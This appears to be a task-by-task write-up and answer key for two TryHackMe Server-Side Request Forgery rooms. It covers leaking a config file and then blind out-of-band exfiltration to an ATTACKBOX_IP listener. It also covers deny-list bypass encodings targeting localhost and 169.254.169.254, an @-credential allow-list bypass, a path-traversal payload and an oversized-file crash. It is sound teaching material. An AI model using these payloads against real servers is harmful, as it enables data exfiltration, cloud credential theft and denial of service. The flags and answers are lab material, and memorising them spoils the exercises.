# TryHackMe — SSRF Rooms

This file covers **two** TryHackMe rooms on Server-Side Request Forgery. Both are explained task-by-task, with every question broken down into *how* the answer is found (the reasoning/technique), not just the raw answer — so the file is useful as a learning reference, not just an answer key.

| Room | Focus | Target App |
|---|---|---|
| [Room 1 — "SSRF"](#room-1--ssrf) | Basic SSRF, internal-network SSRF, blind/OOB SSRF, time-based SSRF, SSRF-driven DoS, remediation | Vulnerable "HRMS" (Human Resource Management System) web app |
| [Room 2 — "Intro to SSRF"](#room-2--intro-to-ssrf-premium-room) | SSRF theory, common vectors, finding SSRF, defeating deny/allow-list defenses, a full practical with a hidden-field + path-traversal exploit | Interactive exercise site + "Acme IT Support" lab |

---

## Room 1 — "SSRF"

### Task 1 — Introduction & Setup

Pure environment setup: start the AttackBox/VPN and the Lab Machine, add `hrms.thm` to `/etc/hosts` if not using the AttackBox, and confirm the HRMS site loads.

| Question | Answer | How it's answered |
|---|---|---|
| I can access the HRMS website. | *(no answer needed)* | Just confirm the site loads after adding the hostname, then click Completed. |

---

### Task 2 — Anatomy of an SSRF Attack

This task is conceptual: it explains that SSRF happens when user-controlled input shapes a server-side request, and presents OWASP's severity metrics for the SSRF category plus three real CVE examples.

| Question | Answer | How it's answered |
|---|---|---|
| What is the average weighted impact for the SSRF vulnerability as per the OWASP Top 10? | `6.72` | This is a direct read from the OWASP metrics table given in the task — "Avg Weighted Impact" is one of the listed columns, no exploitation needed. |

---

### Task 3 — Types of SSRF: Basic (Scenario I — Against the Local Server)

**Mechanism:** The HRMS app auto-redirects to `http://hrms.thm/?url=localhost/copyright`, where the `url` query parameter is used server-side (via `file_get_contents()`-style inclusion) to fetch and render a local PHP file into the page footer — with **no validation of which file** is requested. Since the parameter always resolves against `localhost`, any locally-reachable file path can be substituted.

**Exploitation path:**
1. Notice the app's own navigation reveals the pattern: `?url=localhost/copyright`.
2. Swap `copyright` for other guessed filenames (`hello` → "not found" confirms the app is dynamically resolving files, not just copyright).
3. Guess/try sensitive filenames associated with configuration — `config` is a very common name for a credentials file in small PHP apps — and request `?url=localhost/config`.
4. The raw PHP source of `config.php` (including DB/admin credentials) is reflected directly in the response footer, because the app echoes the *contents* of whatever file it fetches rather than executing or restricting it.
5. Use the leaked credentials to log into the HRMS panel itself.

| Question | Answer | How it's answered |
|---|---|---|
| What is the username for the HRMS login panel? | `hrmsadmin` | Read directly from the leaked `config.php` source once `?url=localhost/config` is requested. |
| What is the password for the HRMS login panel? | `hrmsadmin@123` | Same leaked file — the `$password` variable. |
| What is the admin URL as per the config file? | `http://192.168.2.10/admin.php` | Same leaked file — the `$adminURL` variable; note this is a **private/internal IP**, which sets up Task 4. |
| What is the flag value after successfully logging in to the HRMS web panel? | `THM_{1NiT_S$rF}` | Use the two leaked credentials to log into the HRMS dashboard; the flag is displayed on successful login. |

---

### Task 4 — Types of SSRF: Basic (Scenario II — Accessing an Internal Server)

**Mechanism:** The HRMS dashboard's salary dropdown is populated by fetching data from an internal-only URL (`http://192.168.2.10/employees.php`) that is visible in the page's HTML source. Because the dropdown's data-source value is itself a parameter the browser (and, through SSRF, the server) can be told to fetch, an attacker who already knows the admin panel lives at `192.168.2.10/admin.php` (from Task 3's leaked config) can substitute that URL in place of the expected one.

**Exploitation path:**
1. Log into the HRMS dashboard with the credentials recovered in Task 3.
2. View the page source of the salary dropdown and note it loads its data from `http://192.168.2.10/salary.php` — an address with **no direct route** from outside the internal network.
3. Using browser DevTools (Inspect Element), edit the dropdown's underlying value from `.../salary.php` to `.../admin.php` (the address leaked earlier).
4. Select that option in the UI; the server — which *does* have network access to `192.168.2.10` — fetches and renders the admin panel content, which the attacker's browser could never reach directly.

| Question | Answer | How it's answered |
|---|---|---|
| Is accessing non-routable addresses possible if a server is vulnerable to SSRF (yea/nay)? | `yea` | This is the core lesson of the task: the *server* (not the attacker's browser) makes the request, so it inherits the server's network reachability, including private/non-routable ranges. |
| What is the flag value after accessing the admin panel? | `THM_{B@$ic_s$rF}` | Displayed once the manipulated dropdown successfully loads `admin.php` through the server-side SSRF pivot. |

---

### Task 5 — Types of SSRF: Blind (Out-of-Band)

**Mechanism:** `profile.php` builds a `phpinfo()` dump and `POST`s it to whatever URL is given in its `url` parameter, using `curl`, with **no validation and no response returned to the user** — a textbook blind SSRF. Since nothing comes back in the HTTP response, the only way to retrieve the exfiltrated data is to make the server send it to a listener the attacker controls (an out-of-band channel).

**Exploitation path:**
1. Read the task's `profile.php` source: it takes `$_GET['url']`, builds a `phpinfo()` payload, and `curl`-POSTs it to that URL — never showing the response to the browser.
2. Stand up a simple listener on the AttackBox (`server.py`, a small `http.server`-based script) that logs incoming POST bodies to `data.html`.
3. Visit `http://hrms.thm/profile.php?url=http://ATTACKBOX_IP:8080` so the HRMS server POSTs its `phpinfo()` data to the attacker-controlled listener instead of its legitimate destination.
4. Read `data.html` on the AttackBox — it now contains the full `phpinfo()` output, including PHP build/configuration details that would otherwise never be visible.

| Question | Answer | How it's answered |
|---|---|---|
| Does Out-of-band SSRF always include a technique in which an attacker always receives direct responses from the server (yea/nay)? | `nay` | By definition, OOB/blind SSRF means the response is *not* returned in-band; confirmation comes from a side channel (here, the self-hosted listener), not the app's own HTTP response. |
| What is the value for Virtual Directory Support on the PHP server per the logged data? | `disabled` | Read directly from the `phpinfo()` output captured in `data.html` after the OOB exfiltration. |
| What is the value of the PHP Extension Build on the server? | `API20190902,NTS` | Same `phpinfo()` dump — the "PHP Extension Build" row. |
| Which type of SSRF doesn't give us a direct response or feedback? | `Blind` | Definitional — this is exactly the category being demonstrated in this task. |

*(This task also introduces time-based/semi-blind SSRF conceptually — inferring success from response delay rather than content — but asks no scored question on it.)*

---

### Task 6 — A Classic Example: Crashing the Server

**Mechanism:** `url.php` fetches and base64-encodes an image for display, but only if the fetched image is under 100 KB; anything larger triggers a "memory outage" code path that crashes/hangs the server. Since the image source is itself an SSRF-controllable parameter (`?id=<host>/<path>`), an attacker can point it at an oversized file to deliberately trigger that failure path — turning an SSRF into a denial-of-service primitive.

**Exploitation path:**
1. Note the Training tab loads `http://hrms.thm/url.php?id=192.168.2.10/trainingbanner.jpg` — another internal-IP-driven SSRF vector.
2. Confirm arbitrary internal hosts/paths can be substituted (e.g. `?id=10.10.10.10` loads successfully).
3. Read the leaked `url.php` source (via the same `?url=localhost/url` trick from Task 3) to learn the 100 KB size check and the crash path it triggers when exceeded.
4. Request the lab-provided oversized file: `http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg`, pushing the server into its unhandled large-file code path.

| Question | Answer | How it's answered |
|---|---|---|
| What is the flag value after loading a big image exceeding 100KB? | `THM_{$$rF_Cr@$h3D}` | Displayed once the oversized-image request successfully triggers the server's crash/memory-outage condition. |

---

### Task 7 — Remedial Measures

Conceptual task on SSRF mitigation: input validation, allowlisting over blocklisting, network segmentation, CSP headers, strong internal access controls, and logging/monitoring.

| Question | Answer | How it's answered |
|---|---|---|
| Which of the following is the suggested approach while handling trusted URLs? (a: filter disallowed URLs / b: maintain an allowlist) | `b` | Blocklisting (filtering "bad" values) is explicitly called out as weaker than allowlisting ("only permit known-trusted values") — this mirrors the real-world lesson from Lab 03/06 in this repo's PortSwigger writeups. |
| Since SSRF mainly exploits server-side requests, is it optional to sanitise the input URLs or parameters (yea/nay)? | `nay` | Input validation is listed as the *first* and non-negotiable mitigation in the task — skipping it is precisely the root cause exploited throughout this room. |

---

### Task 8 — Conclusion

No technical question — just a room-completion checkbox summarizing that basic, blind, time-based, and DoS-flavored SSRF were all covered, along with remediation guidance.

---

## Room 2 — "Intro to SSRF" (Premium Room)

### Task 1 — Introduction

Defines SSRF and introduces the two categories used throughout this room (and this repo's PortSwigger writeups): **Regular SSRF** (response is reflected) and **Blind SSRF** (response is not reflected, requiring OOB confirmation). Also summarizes impact categories: internal endpoint access, sensitive data exposure, internal recon, cloud metadata theft (`169.254.169.254`), and credential/token leakage.

| Question | Answer | How it's answered |
|---|---|---|
| What does SSRF stand for? | `Server-Side Request Forgery` | Definitional, stated in the task's opening line. |
| As opposed to a regular SSRF, what is the other type? | `Blind` | Directly named in the task's "Types of SSRF" table. |

---

### Task 2 — SSRF Examples

Covers four common real-world SSRF vectors and how user input ends up in a server-side request for each:

| Vector | How it works |
|---|---|
| Full URL in a parameter | The application takes a complete URL as input (e.g. `?server=api` → `https://server.website.thm/api/item?id=2`) and requests it as-is. |
| Partial URL (hostname/path only) | Only a hostname or path fragment is attacker-controlled; the app builds the rest of the URL server-side. Still exploitable if the fragment isn't validated against an allowlist. |
| Path traversal in the URL | When only a path segment is controlled, `../` sequences can walk the constructed URL outside its intended directory (e.g. reaching `/admin` from a `/item/123/details`-style base). |
| Hidden form fields | Some SSRF vectors aren't visible in the address bar at all — a hidden `<input>` field (e.g. an avatar image path) drives a server-side fetch and is only discoverable by inspecting page source or intercepting requests. |

An interactive "Try It Yourself" exercise then asks the player to manipulate a `server` parameter so the back-end fetches a flag hosted at `/flag?id=9` on a different internal host — directly applying the "Full URL in a Parameter" technique from this task.

| Question | Answer | How it's answered |
|---|---|---|
| What is the flag from the SSRF Examples site? | `THM{SSRF_MASTER}` | Apply the Full-URL-in-a-Parameter technique: redirect the `server` parameter so the resulting server-side request targets `server.website.thm/flag?id=9` instead of the legitimate API endpoint, appending a no-op parameter (e.g. `&x=`) to absorb whatever the app appends afterward. |

---

### Task 3 — Finding an SSRF

Describes the four recognizable SSRF *patterns* (full URL, hidden field, partial URL/hostname-only, path-only) and lists application features that commonly hide SSRF vectors: webhook configuration, PDF/report generation, URL preview/unfurling, file-import-by-URL, and third-party integration settings. It also covers techniques for confirming **blind** SSRF when no response is visible: external HTTP loggers, Burp Collaborator, self-hosted listeners, timing analysis, and error-message inference.

| Question | Answer | How it's answered |
|---|---|---|
| Based on simple observation, which of the following URLs is more likely to be vulnerable to SSRF? (`3`: `fetch-file.php?fname=242533.pdf&srv=filestorage.cloud.thm&port=8001`) | `3` | This is the only option where a parameter (`srv`, paired with `port`) looks like it names a **destination server** the backend will connect to — the hallmark "full URL / hostname-in-a-parameter" pattern from this and the previous task. The other options (`categoryId`, `itemId`/`price`/`q`) are ordinary data-lookup parameters with no server-identifying value. |

---

### Task 4 — Defeating Common SSRF Defenses

Covers the three defense categories and how each is commonly bypassed:

**Deny lists** (block known-bad destinations like `127.0.0.1`, `localhost`, `169.254.169.254`) are fragile because the same address has many equivalent representations:

| Representation | Example |
|---|---|
| Standard | `127.0.0.1` |
| Decimal | `2130706433` |
| Octal | `017700000001` |
| Shorthand | `127.1`, `0`, `0.0.0.0` |
| Wildcard | `127.*.*.*` |
| IPv6 | `[::1]` |
| DNS-based (wildcard-resolving service) | `127.0.0.1.nip.io` |

A deny list that string-matches only the standard form misses all of these — including registering a domain that simply resolves to `169.254.169.254` to reach cloud metadata.

**Allow lists** (only permit an approved domain/pattern) are stronger but still bypassable through simple pattern-matching flaws:

| Technique | Example | Why it works |
|---|---|---|
| Subdomain matching | `https://website.thm.attackers-domain.thm` | The string *starts with* the trusted prefix, but the real hostname is the attacker's domain. |
| URL credential abuse | `https://website.thm@attacker.com/` | Some HTTP clients treat everything before `@` as userinfo/credentials — the allow-list check sees `website.thm`, but the actual connection goes to `attacker.com`. |

**Open redirects**: when both defenses hold against direct manipulation, chaining through the target site's own open-redirect feature (e.g. `/link?url=<destination>`) still satisfies an allow list that only checks the URL *starts with* the trusted domain, because the server then follows the redirect to the real (forbidden) destination.

| Question | Answer | How it's answered |
|---|---|---|
| What method can be used to bypass strict rules? | `Open Redirect` | Named directly as the technique used when both deny-list and allow-list bypasses fail. |
| What IP address may contain sensitive data in a cloud environment? | `169.254.169.254` | The standard link-local address used by AWS/GCP/Azure to serve instance metadata (including temporary credentials) to the instance itself. |
| What type of list is used to permit only certain input? | `Allow List` | Definitional — matches the task's own terminology. |
| What type of list is used to stop certain input? | `Deny List` | Definitional — the complementary term used throughout the task. |

---

### Task 5 — SSRF Practical (Acme IT Support)

**Scenario:** Two endpoints are known: `/private` (returns an IP-based access error — only reachable from the server itself) and `/customers/new-account-page` (has an avatar-selection feature that turns out to be the actual SSRF vector).

**Mechanism:** The avatar feature stores the selected image's **path** in a form field. The server fetches whatever path that field holds and embeds it back into the page as a base64 data URI — meaning *any* readable server-side resource, not just an image, gets fetched and returned (base64-encoded) if the field's value is redirected. A deny list blocks paths starting with `/private` as a literal string, but it only checks the **raw, unnormalized** input — before the webserver resolves directory-traversal sequences.

**Exploitation path:**
1. Create an account, open the new-account page, and inspect the source: each avatar's `value` attribute is a raw file path, and the surrounding `background-image` CSS confirms the server renders whatever that path points to.
2. Select an avatar normally and observe the page source again: the avatar is now rendered as a base64-encoded `data:` URI — confirming the server fetches the path's *contents* and inlines them, not just a static image reference.
3. Using DevTools, edit a radio button's `value` directly to `private` and submit — the app returns an explicit error that paths starting with `/private` are blocked (a deny list keyed on the literal string).
4. Apply the lesson from Task 4: a deny list validates the *raw* string, while the webserver resolves the path *after* validation. Supplying `x/../private` passes the string check (it doesn't start with `/private`) but path-normalizes on the server to exactly `/private`.
5. Submit the avatar update with that value; the page source now contains a base64 blob representing `/private`'s actual contents instead of an image.
6. Decode it locally: `echo "<base64>" | base64 -d` to reveal the flag.

| Question | Answer | How it's answered |
|---|---|---|
| What is the flag from the `/private` directory? | `THM{YOU_WORKED_OUT_THE_SSRF}` | Recovered by base64-decoding the avatar `<img>` tag's `src` content after submitting the `x/../private` directory-traversal payload, which bypasses the deny list's raw-string check but normalizes to the forbidden `/private` path once the server resolves it. |

---

## Cross-Reference to This Repo's PortSwigger Methodology

Both rooms reinforce the same patterns documented in [`METHODOLOGY.md`](./METHODOLOGY.md) and the PortSwigger lab writeups in this folder:

| TryHackMe concept | Equivalent in this repo |
|---|---|
| Basic SSRF against `localhost` (Room 1, Task 3) | `Lab-01-Basic-SSRF-Local-Server.md` |
| Internal-network SSRF via a private IP (Room 1, Task 4) | `Lab-02-Basic-SSRF-Backend-System.md` |
| Blind/OOB SSRF via a self-hosted listener (Room 1, Task 5) | `Lab-05-Blind-SSRF-OOB-Detection.md` |
| Deny-list bypass via alternate IP encodings (Room 2, Task 4) | `Lab-03-Blacklist-Filter-Bypass.md` |
| Allow-list bypass via `@`-credentials / subdomain tricks (Room 2, Task 4) | `Lab-06-Whitelist-Filter-Bypass.md` |
| Open-redirect chaining to bypass an allow list (Room 2, Task 4–5) | `Lab-04-Open-Redirect-Filter-Bypass.md` |
| Path-traversal bypass of a raw-string deny list (Room 2, Task 5) | Same root cause as `Lab-03` — validation on the unnormalized string vs. the resolved path |

## References

- TryHackMe — "SSRF" room (HRMS-based)
- TryHackMe — "Intro to SSRF" room (Premium)
- [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP Top 10](https://owasp.org/Top10/)
